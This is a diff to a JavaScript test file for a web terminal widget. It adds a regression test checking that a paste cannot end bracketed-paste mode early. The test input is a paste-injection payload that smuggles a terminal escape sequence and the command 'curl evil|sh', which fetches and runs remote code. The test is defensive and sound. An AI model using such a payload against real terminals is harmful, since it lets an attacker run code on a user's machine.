@@ -184,6 +184,10 @@ if (mode === "widget") {
   island.fire("paste", { clipboardData: { getData: () => "x" }, preventDefault() {} });
   runTimers();
   T("bracketed paste mode wraps a paste", evs(), [["skyisland-input", { data: "\x1b[200~x\x1b[201~" }]]);
+  island.events.length = 0;
+  island.fire("paste", { clipboardData: { getData: () => "ls\x1b[201~curl evil|sh\r\x07" }, preventDefault() {} });
+  runTimers();
+  T("a paste cannot end bracketed paste early (A-4)", evs(), [["skyisland-input", { data: "\x1b[200~ls[201~curl evil|sh\r\x1b[201~" }]]);
   I.command("t1", "frame", { seq: 2, base: 1, st: [[-1, -1, 0]], ops: [["r", 1, 5, 0, "!"], ["t", "vim"], ["b", 1]] });
   runTimers();
   T("a diff frame updates one row", textRows().slice(0, 2), ["hello", "world!"]);
